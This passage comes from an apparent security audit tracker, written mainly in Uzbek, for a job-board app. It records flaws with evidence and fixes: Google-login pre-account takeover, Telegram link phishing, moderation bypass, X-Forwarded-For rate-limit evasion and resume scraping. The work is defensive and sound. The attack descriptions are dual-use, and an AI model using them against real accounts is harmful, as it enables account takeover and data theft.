- **Evidence:** AdminShell.tsx:11-13; docs/audit/maps/API_MAP.md:154 '(**tokendagi** rol; requireStaff emas)'; admin.routes.ts:25 `requireStaff("admin")`; auth-guard.ts:52-59, 76-84.
- **Recommended fix:** AdminShell izohini va API_MAP 12-bo'lim sarlavhasini yangilang.
- **Severity izohi:** P3 saqlandi. ISSUE-035 fix'idan keyin yangilanmay qolgan hujjat (root cause: hujjat drift'i).
- **Manba topilmalar:** admin-staff-16
- **Bajarilgan fix:** admin-staff-16: PARTIAL — The AdminShell comment now describes requireAuth + requireStaff with DB-read role/block state. docs/audit/maps/API_MAP.md:154 still says the token role is trusted; that file belong
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-012

**Yangi auth qoidalari uchun persistent ma'lumot modeli yo'q: tiklash tokenlari, backup telefon, qo'lda tiklash, security audit log**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-012
- **Area:** schema/auth
- **Fayl:** `apps/api/prisma/schema.prisma:160`
- **Root cause:** Sxemada recovery/verification challenge, qo'lda tiklash so'rovi, security event va tasdiqlangan backup telefon kolleksiyalari yo'q. Telegram link va login tokenlari jarayon xotirasida xom Map kalitlari sifatida. Yagona backup maydon JobSeekerProfile.additionalPhone — erkin matn, tasdiqlanmagan, employer'da yo'q. Parolni tiklash kodi umuman yo'q.
- **Impact:** Rule B, F, H, I, J, L ni amalga oshirib bo'lmaydi: bir martalik, hashlangan, replay himoyali tokenlar va reset'dan keyin bekor qilish persistent holat talab qiladi. Restart tokenlarni yo'qotadi. Telefon tasdig'i, Telegram link/unlink va admin harakatlari audit izisiz.
- **Evidence:** schema.prisma:160-807 recovery/audit/identity modeli yo'q; faqat StaffInvite tokenHash (704-720). :217 additionalPhone String?; profile.routes.ts:16 max(30). telegram.service.ts:90 linkTokens Map, :131 loginTokens Map (30/5 daqiqa TTL). grep forgot|recovery|resetPassword apps/api/src — natija yo'q. telegram.routes.ts:38-44 unlink audit yozmaydi.
- **Recommended fix:** AuthChallenge {purpose, tokenHash @unique, userId?, expiresAt TTL, usedAt, attempts} — shartli update (usedAt null→now) bilan iste'mol. RecoveryRequest {userId, status, reviewedBy, decidedAt}. SecurityEvent {userId, type (rule L ro'yxati), actorId, ip, createdAt, allowlist meta}. Backup telefon VerifiedPhone kind=backup. Reset'da tokenVersion++ va ochiq challenge'larni bekor qilish. StaffInvite hash naqshini qayta ishlating; TTL indeks $runCommandRaw bilan.
- **Severity izohi:** P1 saqlandi. ISSUE-012 (NOT FIXED) bilan bir xil asosiy bo'shliq (tiklash yo'q); yangi qoidalar qamrovni audit log, backup telefon va qo'lda tiklashga kengaytirdi.
- **Manba topilmalar:** data-integrity-4
- **Bajarilgan fix:** data-integrity-4: FIXED — AuthChallenge, RecoveryRequest, SecurityEvent and the backup-phone fields are persisted (additive, no backfill).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-042

**Google login bir xil emailli tasdiqlanmagan mavjud hisobga egalik isbotisiz birlashadi (pre-account takeover)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-042
- **Area:** identity/google
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:222`
- **Root cause:** googleLogin email bo'yicha findUnique qiladi va hisob bo'lsa darhol token beradi. Parol bilan ro'yxatdan o'tganlarda isEmailVerified doim false, ya'ni hisob boshqa odamniki bo'lishi mumkin. Provider-link yozuvi yo'q, birlashtirish audit qilinmaydi.
- **Impact:** Hujumchi victim@gmail.com bilan parolli hisob ochadi; egasi keyin Google bilan kirib hujumchi hisobidan foydalanadi (rezyume, arizalar, chat), hujumchi paroli ishlashda davom etadi. Session policy: Google avtomatik xavfsiz bo'lmagan birlashtirmasligi kerak.
- **Evidence:** auth.service.ts:224-227 `existing = findUnique({email}); if (existing) { assertNotBlocked; return issueTokens(...) }`. Google yaratgan hisobda isEmailVerified:true (:235-241), registerUser esa o'rnatmaydi. DECISIONS.md D-011 birlashtirishni saqlagan.
- **Recommended fix:** existing.isEmailVerified false bo'lsa avtomatik birlashtirmang: 409 qaytarib parol bilan kirib sozlamalardan Google ulashni so'rang. AuthIdentity {provider, subject @unique, userId} saqlang. Tasdiqlangan ulashda tokenVersion++ va 'Google linked' security event.
- **Severity izohi:** Tracker P2 edi; egasining yangi session policy qoidasi (Google xavfsiz bo'lmagan birlashtirmasin) buni product rule buzilishiga aylantirdi, shuning uchun P1.
- **Manba topilmalar:** data-integrity-5
- **Bajarilgan fix:** data-integrity-5: FIXED — Same.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-042

**Google login mavjud email hisobiga avtomatik kiritadi (pre-account takeover); D-011 buni saqlab qolgan**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-042
- **Area:** auth/google
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:222`
- **Root cause:** googleLogin email bo'yicha topilgan istalgan hisobga token beradi: hisob Google orqali yaratilganmi yoki email tasdiqlanganmi, tekshirilmaydi. Parol bilan ro'yxatdan o'tishda email hech qachon tasdiqlanmaydi. D-011 tiklash oqimi yo'qligini (D-010) sabab qilib birlashtirishni ataylab saqlagan.
- **Impact:** Hujumchi jabrlanuvchining emaili bilan parolli hisob ochadi. Jabrlanuvchi keyin Google bilan kirganda shu hisobga tushadi va profil, rezyume, xabarlarni to'ldiradi, hujumchi esa parol bilan kirishda davom etadi. Egasining 'Google login mavjud hisobga xavfsiz bo'lmagan tarzda birlashmasin' siyosati buziladi.
- **Evidence:** auth.service.ts:222-225 `const existing = await prisma.user.findUnique({ where: { email } }); if (existing) { assertNotBlocked(existing); return issueTokens(existing.id, ...) }`: provider yoki isEmailVerified tekshiruvi yo'q. schema.prisma:166 `isEmailVerified @default(false)`; parol bilan ro'yxatdan o'tish uni true qilmaydi, faqat yangi Google foydalanuvchida true (auth.service.ts:241). DECISIONS.md:117-126 (D-011, xavf PARTIAL). ISSUE-042 PARTIAL.
- **Recommended fix:** Google orqali yaratilmagan yoki Google bog'lanmagan hisobga Google bilan kirishni rad eting (masalan 409 va 'parol bilan kiring yoki tiklang' ko'rsatmasi, uz/ru/en). Google'ni faqat tizimga kirgan foydalanuvchi aniq 'Google'ni bog'lash' amali orqali ulay olsin, User'da googleSub saqlansin. B tiklash oqimi chiqqach D-011'ning qulflanish haqidagi dalili o'z kuchini yo'qotadi: uni bekor qiluvchi qaror yozing va ISSUE-042'ni yangilang.
- **Severity izohi:** Trackerda P2 edi (D-011). Egasining sessiya siyosati xavfsiz bo'lmagan Google birlashtirishni aniq taqiqlagani uchun P1 ga ko'tarildi.
- **Manba topilmalar:** docs-5
- **Bajarilgan fix:** docs-5: FIXED — D-055 qabul qilindi va DECISIONS.md ga yozildi (D-011 o'rnini bosadi)
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-027

**Sharh moderatsiyasini chetlab o'tish: muallif rad etilgan sharhni o'chirib qayta yuborsa, u darhol 'approved' bo'ladi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-027
- **Area:** authz/moderation
- **Fayl:** `apps/api/src/modules/reviews/reviews.routes.ts:88`
- **Root cause:** ISSUE-027 fix'i faqat yangilash yo'lini yopgan. DELETE /api/reviews/:id muallifga istalgan statusdagi sharhni butunlay o'chirishga ruxsat beradi. Bu [companyId, userId] slotini bo'shatadi, keyingi POST esa create tarmog'iga tushadi va u doim status 'approved' yozadi. Admin o'chirgan sharh ham xuddi shu yo'l bilan qayta tiklanadi.
- **Impact:** Kompaniyaga bir marta ariza bergan nomzod admin rad etgan yoki o'chirgan matnni admin ishtirokisiz darhol qayta e'lon qiladi. Sharh ochiq ko'rinadi, reviewSummary va reyting saralashiga ta'sir qiladi. 'Moderatsiyani chetlab o'tish imkonsiz bo'lsin' qoidasi buziladi.
- **Evidence:** reviews.routes.ts:40-43 existing companyId+userId bo'yicha qidiriladi; :52 update'da `existing.status === 'approved' ? 'approved' : 'pending'`; :55-61 create `status: 'approved'`; :88-93 DELETE faqat `review.userId !== req.user!.sub && role !== 'admin'` tekshiradi (status emas), keyin `companyReview.delete`. Web o'chirish tugmasini ko'rsatadi (CompanyReviews.tsx:114). e2e'da o'chirib qayta yaratish holati yo'q.
- **Recommended fix:** Sharhni butunlay o'chirmang: muallif va admin o'chirishida deletedAt bilan soft-delete qiling va statusni saqlang. POST'da tombstone yoki rejected/pending yozuv bo'lsa, yaratish yoki yangilash 'pending' bilan bo'lsin. Ochiq so'rovlar va reviewSummary deletedAt'ni hisobga olmasin. Muqobil yo'l: muallifga rejected yoki pending sharhni o'chirishni taqiqlang. e2e qo'shing: rad etish -> muallif o'chiradi -> qayta POST -> 'pending'.
- **Severity izohi:** P1 saqlandi: mahsulot qoidasidagi moderatsiya bypass'i; ISSUE-027 FIXED deb belgilangan, lekin fix aylanib o'tiladi.
- **Manba topilmalar:** gap2-1
- **Bajarilgan fix:** gap2-1: FIXED — The finding's scenario (author deletes a REJECTED review and re-POSTs it, which auto-approves) is closed: the author can only delete an approved review, so the unique slot stays ta
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-012

**Telegram orqali parolni tiklash oqimi yo'q; FAQ Telegram-login'ni tavsiya qiladi, tracker esa email-reset'ni rejalashtirgan**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-012
- **Area:** auth/recovery
- **Fayl:** `apps/web/src/pages/login/+Page.tsx:83`
- **Root cause:** ISSUE-012 hali ochiq (NOT FIXED, D-010): backend'da forgot/reset/change-password endpointlari yo'q. Yordam matni bu bo'shliqni Telegram-login bilan to'ldirish uchun yozilgan. ISSUE-012 va FINAL_AUDIT'dagi reja egasi qaror qabul qilishidan oldin yozilgan va email orqali tiklashni (PasswordReset + sendMail) nazarda tutadi.
- **Impact:** Parolini unutgan foydalanuvchi (10k foydalanuvchida bu har kuni bo'ladi) hisobiga qaytolmaydi. FAQ uch tilda taqiqlangan login kanalini (A) tavsiya qiladi. ISSUE-012 rejasiga amal qilgan dasturchi B qoidasi taqiqlagan email-reset'ni quradi va I/J talablarini o'tkazib yuboradi: hash'langan bir martalik token, replay himoyasi, sessiya va challenge'larni bekor qilish, lockout'siz limitlar.
- **Evidence:** login/+Page.tsx:83 `href={l('/support')}` (forgot havolasi). messages.uz.ts:469 «Hozircha parolni saytda o'zingiz tiklash imkoni yo'q ... «Telegram» orqali kirishingiz mumkin» (ru/en ham shunday). DESIGN.md:184 «javob — Telegram orqali kirish yoki /contact». auth.routes.ts'da faqat register/login/refresh/logout/me/telegram/google. ISSUES.md:405-408 fix rejasi: PasswordReset + POST /api/auth/forgot + sendMail. DECISIONS.md:106 (D-010). FINAL_AUDIT.md:10,391,453 kanal qarori 'email yoki Telegram'.
- **Recommended fix:** Avval A-L qoidalarini D-040 qarori sifatida yozing. Keyin B oqimini quring: telefon raqami -> bir martalik, qisqa muddatli, hash'langan tasodifiy payload bilan Telegram deep-link -> bot chat va telefon egaligini tekshiradi -> bir martalik tiklash ruxsati -> saytga qaytish havolasi -> yangi parol -> tokenVersion oshiriladi, barcha tiklash tokenlari va link/challenge yozuvlari bekor qilinadi. Telefon va IP bo'yicha limit qo'ying, noma'lum raqamga ham bir xil javob bering. ISSUE-012'ning fix/test rejasini va FINAL_AUDIT tavsiyasini shunga moslang. Oqim tayyor bo'lguncha FAQ'dan Telegram-login maslahatini olib tashlang, keyin uz/ru/en matnni va login havolasini yangi sahifaga moslang.
- **Severity izohi:** P1 saqlandi (docs-2). docs-9 (P2, faqat hujjat) ildizi bir xil bo'lgani uchun shu muammoga qo'shildi.
- **Manba topilmalar:** docs-2, docs-9
- **Bajarilgan fix:** docs-2: PARTIAL — All three FAQ 'password' answers now describe the Telegram recovery flow (/login?recover=1) with manual recovery (/login?recover=manual) as the fallback and state that Telegram is  | docs-9: FIXED — ISSUES.md Round 3 bo'limi va D-045 tiklash oqimini hujjatlashtiradi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-026

**Server import qiladigan modullar va butun docs/ git'da untracked: DEPLOY.md'dagi GitHub'dan deploy buzilgan HEAD'ni quradi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-026
- **Area:** infra/deploy
- **Fayl:** `DEPLOY.md:48`
- **Root cause:** Ish ataylab commit qilinmagan (D-002, D-030), ISSUE-026 esa foydalanuvchi qaror qilgunicha WONT FIX holatida turibdi. Shu bilan birga DEPLOY.md Railway va Vercel'ni to'g'ridan-to'g'ri GitHub repo'dan deploy qilishni ko'rsatadi.
- **Impact:** GitHub'dan deploy qilinganda import qilinadigan fayllar bo'lmaydi va build yoki runtime yiqiladi. Audit hujjatlari versiyalanmagan va ularni ko'rib chiqib bo'lmaydi; lokal disk yo'qolsa, ish ham yo'qoladi.
- **Evidence:** `git status --short` untracked: apps/api/src/common/{cache,login-guard,ownership,time}.ts; modules/support/, modules/team/, articles/articles.{admin.routes,content,permissions,backfill}.ts, vacancies/vacancies.rules.ts; apps/web/src/lib/auth/, lib/employer/, components/employer/, pages/articles/, pages/admin/team/; docs/. DEPLOY.md:48 «Deploy from GitHub repo». ISSUES.md:688 ISSUE-026 WONT FIX. Tarixda faqat 3 ta boshlang'ich commit bor.
- **Recommended fix:** Foydalanuvchi qarori bilan alohida branch'ga commit qiling: redesign va audit ishini mantiqiy commitlarga ajrating va docs/audit'ni ham versiyalang. typecheck, build, test:e2e va test:unit ishlaydigan CI qo'shing. DEPLOY.md'da deploy shu fayllarning commit qilinishiga bog'liqligini va deploydan oldin `git status` toza bo'lishi kerakligini yozing.
- **Severity izohi:** P1 saqlandi: HEAD'dan deploy production'ni to'xtatadi, lekin ish lokalda bor va qaror kutilmoqda, shuning uchun P0 emas.
- **Manba topilmalar:** docs-8
- **Bajarilgan fix:** docs-8: PARTIAL — DEPLOY.md now carries an explicit warning listing the untracked modules (login-guard, cache, ownership, time, support, team, files, web auth/employer/articles, docs/) and requires 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-012

**Telegram orqali parolni tiklash va parolni o'zgartirish yo'q; 'Parolni unutdingizmi?' /support'ga olib boradi (qoidalar B, I, J)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-012
- **Area:** auth/recovery
- **Fayl:** `apps/web/src/pages/login/+Page.tsx:83`
- **Root cause:** Tiklash D-010 bilan kechiktirilgan va qurilmagan. Tiklash challenge modeli, hash'langan bir martalik token, botdagi tiklash payload handler'i va change-password endpoint'i yo'q.
- **Impact:** Parolini unutgan foydalanuvchi rezyume, arizalar va suhbatlariga faqat support qo'lda aralashsa qaytadi. Kirgan foydalanuvchi buzilgan parolni almashtira olmaydi. I va J qoidalarini qo'llaydigan joy yo'q.
- **Evidence:** login/+Page.tsx:83 href={l("/support")} {t.login.forgot}; AccountSettings.tsx:88 parol qatori /support'ga; auth.routes.ts'da faqat register/login/refresh/logout/me/telegram/google; telegram.service.ts:243-281 handleStart faqat link va lg payload'larini biladi.
- **Recommended fix:** Yangi sahifa ochmasdan /login ichida recover rejimi qo'shing: telefon -> POST /api/auth/recovery/start (rate limit, doim bir xil javob) -> DB'da hash'langan, 10 daqiqalik, bir martalik challenge va tasodifiy t.me payload -> bot from.id bog'langan chatga mosligini tekshiradi -> bir martalik sayt havolasi -> yangi parol. So'ng tokenVersion++, barcha challenge'lar bekor, audit. Profil sozlamalariga change-password qo'shing.
- **Severity izohi:** P1 saqlandi (ISSUE-012 NOT FIXED). Token xotiradagi Map'da emas, DB kolleksiyasida saqlansin: restart va replikalarda yo'qolmasin.
- **Manba topilmalar:** candidate-flows-2
- **Bajarilgan fix:** candidate-flows-2: FIXED — The recover mode lives on /login inside AuthShell exactly as recommended (no new page) and the settings password row now links to it instead of /support. The server flow is owned b
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-010

**Telegram bog'lash deep-link'i tasdiqsiz ishlaydi: hujumchi jabrlanuvchining telefonini o'z hisobiga tasdiqlatadi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-010
- **Area:** security/phone-verification
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:262`
- **Root cause:** Link token hujumchi hisobi uchun bearer token. Bot havolani ochgan har qanday chatni bog'laydi, qaysi hisob ekanini ko'rsatmaydi va tasdiq so'ramaydi. ISSUE-010 fix'idagi tasdiq faqat login oqimini qamragan.
- **Impact:** Bir klikli phishing: jabrlanuvchining Telegram'i va telefoni hujumchi hisobining tasdiqlangan identifikatoriga aylanadi. Spam gate chetlab o'tiladi va soxta arizalarda begona raqam chiqadi. Jabrlanuvchining o'z hisobi jimgina uziladi. D/E/F qoidalariga zid; Telegram tiklash qurilsa, hisob egallash vektoriga aylanadi.
- **Evidence:** telegram.service.ts:262 verifyLinkToken(payload); :269-272 updateMany boshqa hisobdan telegramChatId'ni tozalaydi; :273 update; :275-280 '✅ Hisobingiz bog'landi' + CONTACT_KEYBOARD, hisob ko'rsatilmaydi; :333-342 kontakt chatga bog'langan hisobga phone va isPhoneVerified:true yozadi. Login oqimida esa 174-189 tasdiq bor.
- **Recommended fix:** Bog'lashdan oldin botda niqoblangan hisob identifikatori bilan Tasdiqlash/Rad etish tugmalarini ko'rsating. Telegram boshqa hisobga bog'langan bo'lsa, uni ko'chirmay rad eting. Telefon ulashishni shu ekranda qayta tasdiqlating. telegram_linked va phone_verified audit hodisalarini yozing.
- **Severity izohi:** P1: ISSUE-010 root cause'ida aynan link varianti yozilgan, lekin fix faqat login'ni tuzatgan, shuning uchun FIXED holati to'liq emas. Hozircha hisob egallash emas, telefon identifikatorini o'g'irlash, shuning uchun P0 emas.
- **Manba topilmalar:** candidate-flows-3
- **Bajarilgan fix:** candidate-flows-3: FIXED — Same; a verified primary phone can no longer be captured, and a different verified number is refused with a 'use phone change' reply.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-042

**Google login tasdiqlanmagan email bilan ochilgan mavjud hisobga avtomatik birlashadi (pre-account takeover)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-042
- **Area:** auth/google-merge
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:223`
- **Root cause:** googleLogin faqat email mosligiga ishonib, mavjud foydalanuvchiga token beradi. Parol bilan ro'yxatdan o'tganda email hech qachon tasdiqlanmaydi.
- **Impact:** Hujumchi victim@gmail.com bilan parolli hisob ochib qo'yadi. Haqiqiy egasi keyin Google bilan kirib rezyume to'ldiradi va ariza yuboradi, hujumchi paroli esa ishlashda davom etib rezyume, arizalar va suhbatlarni ochadi. Egasining 'Google xavfsiz bo'lmagan tarzda birlashmasin' qoidasiga zid.
- **Evidence:** auth.service.ts:222-225 `const existing = await prisma.user.findUnique({ where: { email } }); if (existing) { assertNotBlocked(existing); return issueTokens(...) }` — isEmailVerified ham, rozilik ham tekshirilmaydi; isEmailVerified hech qayerda true bo'lmaydi (D-011).
- **Recommended fix:** Mavjud hisob isEmailVerified=false va parolli bo'lsa avtomatik birlashtirmang. Ikki variant: avval parol bilan kirib, keyin aniq bog'lashni talab qilish; yoki birinchi Google kirishda parolni bekor qilish, tokenVersion++, isEmailVerified=true va audit. googleSub'ni saqlab, keyingi kirishlarda shu bo'yicha moslang.
- **Severity izohi:** P2 -> P1: egasining yangi sessiya siyosati buni aniq qoidaga aylantirdi. Parolni bekor qilish varianti Telegram tiklash oqimi mavjud bo'lishiga bog'liq.
- **Manba topilmalar:** candidate-flows-8
- **Bajarilgan fix:** candidate-flows-8: FIXED — Pre-account takeover closed.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-011

**TRUST_PROXY sukut bo'yicha true: soxta X-Forwarded-For barcha IP rate-limitlarini chetlab o'tadi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-011
- **Area:** rate-limit/proxy
- **Fayl:** `apps/api/src/common/env.ts:116`
- **Root cause:** TRUST_PROXY sukuti "true" va to'g'ridan-to'g'ri Fastify trustProxy ga beriladi, shuning uchun req.ip mijoz boshqaradigan XFF'dan olinadi. @fastify/rate-limit req.ip bo'yicha kalitlaydi. .env.example ham true beradi, DEPLOY faqat '1' ni tavsiya qiladi. Register uchun email yoki global cheklov yo'q. Har login va register argon2id (64MiB, t=3) ishlatadi.
- **Impact:** XFF aylantirib register (10/min), google, telegram/start, refresh, support va global 600/min limiti chetlab o'tiladi: ommaviy soxta hisoblar, parol purkash, argon2 navbati bilan libuv threadpool'ni to'ldirish (upload, DNS kechikishi — taxmin). Kelajakdagi recovery va Telegram tasdiq limitlari (I qoidasi) ham req.ip ga tayansa, xuddi shunday chetlab o'tiladi.
- **Evidence:** env.ts:113-123 .default("true"); .env.example:52 TRUST_PROXY=true; server.ts:77 trustProxy: env.TRUST_PROXY, :129-139 rateLimit kalit req.ip; auth.routes.ts:59-61, 64, 137, 164; DEPLOY.md:70; D-007 probe: 12 xil XFF bilan 429 chiqmagan.
- **Recommended fix:** Railway'da req.ips ni loglab hop sonini aniqlang va production'da TRUST_PROXY=1 (yoki CIDR) qo'ying. Production'da true bo'lsa server ishga tushmasin. Auth va recovery limitlarini normallashtirilgan email/telefon + IP bo'yicha, doimiy saqlanadigan qilib kalitlang. Register uchun global daqiqalik cheklov va argon2 atrofida semafor (masalan 4 parallel, navbat to'lsa 429/503) qo'shing.
- **Severity izohi:** P1 (auth-core-9 P2 bergan). ISSUE-011 PARTIAL: hop soni sozlanadigan bo'ldi, lekin sukut hali true. I qoidasi ishlaydigan limitlarni talab qiladi.
- **Manba topilmalar:** auth-core-9, headers-infra-1
- **Bajarilgan fix:** auth-core-9: FIXED — Same default change protects signup/login argon2 work. | headers-infra-1: FIXED — TRUST_PROXY default is now 1 (single hop), so a client-supplied X-Forwarded-For cannot change the rate-limit key; the effective value is logged at startup by server.ts.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-042

**Google login bir xil emailli mavjud hisobga (tasdiqlanmagan parolli va admin hisoblariga ham) avtomatik kiritadi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-042
- **Area:** auth/google
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:222`
- **Root cause:** googleLogin normallashtirilgan email bo'yicha topilgan istalgan hisobga token beradi. Register emailni tasdiqlamaydi (isEmailVerified false qoladi), User'da Google sub yoki bog'lash maydoni yo'q, rol cheklovi ham yo'q.
- **Impact:** Pre-account takeover: hujumchi victim@gmail.com bilan parol qo'yib ro'yxatdan o'tadi; qurbon keyin 'Google bilan davom etish'ni bossa hujumchi hisobida ishlaydi, hujumchi esa parol bilan rezyume, ariza va chatlarga kirishni saqlab qoladi. Google pochtasidagi admin yoki xodim hisobiga parol va login-guard'siz kiriladi. 'Google login xavfsiz bo'lmagan birlashtirish qilmasin' qoidasi buziladi.
- **Evidence:** auth.service.ts:222-226 `if (existing) { assertNotBlocked(existing); return issueTokens(...) }`; :37-60 register tasdiqsiz; :241 isEmailVerified faqat Google yaratgan hisobda true; schema.prisma:160-205 googleSub yo'q; D-011 merge ataylab saqlangan.
- **Recommended fix:** User'ga googleSub (unique, sparse) qo'shing va faqat googleSub bo'yicha kiriting. Email googleSub'siz hisobga tegishli bo'lsa 409 ACCOUNT_EXISTS qaytaring: foydalanuvchi parol bilan kirib, sozlamalarda parolni qayta kiritib Google'ni bog'laydi. Staff/admin rollarini hech qachon avtomatik bog'lamang. Google orqali yaratilgan hisoblarda birinchi kirishda googleSub ni to'ldiring.
- **Severity izohi:** Tracker P2 -> P1: egasi Google merge xavfsiz bo'lmasligi kerakligini aniq qoida qilib qo'ygan, admin/xodim hisoblari ham ta'sirlanadi. ISSUE-042 PARTIAL (D-011).
- **Manba topilmalar:** auth-core-4, authz-idor-7
- **Bajarilgan fix:** auth-core-4: FIXED — Staff/admin accounts are additionally excluded from Google sign-in and must use a password. | authz-idor-7: FIXED — D-055: Google sign-in no longer merges into an account whose email was never proven (409 GOOGLE_ACCOUNT_EXISTS).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-010

**Telegram bog'lash deep-link tasdiqsiz: chat boshqa hisobdan jimgina uziladi, hujumchi hisobiga qurbon telefoni tasdiqlanadi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-010
- **Area:** auth/telegram-link
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:262`
- **Root cause:** handleStart bog'lash tokeniga (faqat userId bilan bog'langan bearer token) tayanib chatni darhol bog'laydi. Oldin updateMany bilan chatni boshqa hisobdan uzadi, qaysi hisob ekanini ko'rsatmaydi va tasdiq so'ramaydi, keyin kontakt klaviaturasini chiqaradi. ISSUE-010 fix'i faqat login oqimiga tasdiq qo'shgan.
- **Impact:** Hujumchi o'z hisobi uchun havola yaratib qurbonga yuboradi. Qurbon Start bosib kontakt ulashsa, hujumchi hisobi qurbonning tasdiqlangan telefonini oladi (requirePhoneVerified chetlab o'tiladi), qurbonning o'z hisobi esa Telegramdan jimgina uziladi. Telegram tiklash kanali bo'lganda bu hisobni egallash vositasiga aylanadi.
- **Evidence:** telegram.service.ts:90-110 token Map'da xom holda; :262-273 verifyLinkToken -> updateMany({telegramChatId: chatId, id: {not: userId}}) null -> update; :275-280 umumiy 'Hisobingiz bog'landi!' + CONTACT_KEYBOARD; telegram.routes.ts:25-35 link faqat requireAuth, route limiti yo'q; :38-44 unlink audit'siz.
- **Recommended fix:** Ikki bosqichli bog'lash: bot niqoblangan email (u***@mail.uz) va saytda ham ko'rinadigan qisqa kodni ko'rsatadi; Tasdiqlash/Rad etish callback'i from.id bilan tekshiriladi. Boshqa hisobga ulangan chat yoki Telegram foydalanuvchisini qayta bog'lashni rad eting. telegramUserId (from.id) ni unique saqlang, ikkala hisobni xabardor qiling, security event yozing. Tokenni hash qilib DB'da TTL bilan saqlang.
- **Severity izohi:** P1 saqlandi. ISSUE-010 root cause'i link-token variantini aniq tilga olgan va unga tasdiq tugmasini tavsiya qilgan, lekin fix faqat login oqimida bajarilgan. Link oqimi hozirgi kodda o'zgarmagan.
- **Manba topilmalar:** auth-core-6, telegram-2, authz-idor-2
- **Bajarilgan fix:** auth-core-6: FIXED — Link binding now requires an open, unexpired, single-use challenge plus a contact shared by the same Telegram user id. | telegram-2: FIXED — Deep links are DB challenges bound to the requesting account; an identity already used by another account is rejected with the generic reply and nothing is re-linked. Residual soci | authz-idor-2: FIXED — No silent chat takeover: telegramOwner() blocks identities that belong to another account; the previous updateMany that detached the chat is gone.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-008

**Tasdiqlanmagan istalgan employer hisobi barcha ochiq nomzodlarning ismi va to'liq rezyumesini ommaviy yig'a oladi; ko'rinish sukut bo'yicha yoqilgan**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-008
- **Area:** privacy/candidate-data
- **Fayl:** `apps/api/src/modules/candidates/candidates.routes.ts:34`
- **Root cause:** Nomzod qidiruvi faqat employer roli va o'zi yaratgan kompaniyani talab qiladi: telefon yoki kompaniya tasdiqi yo'q, akkaunt kvotasi yo'q, sahifalash 200×50 gacha. isOpenToWork sukut true va rezyumeni saqlash uni har doim published qiladi, shuning uchun nomzodlar aniq rozilik bermasdan ro'yxatda turadi.
- **Impact:** Bir martalik employer (email+parol, keyin PUT company) skript bilan ~10k profilni yig'adi: to'liq ism, hudud, headline, reyting va oxirgi rezyume (summary, kutilgan maosh, ish tajribasi tavsifi, ta'lim). 'Nomzod shaxsiy ma'lumoti faqat vakolatli ish beruvchiga' qoidasiga zid.
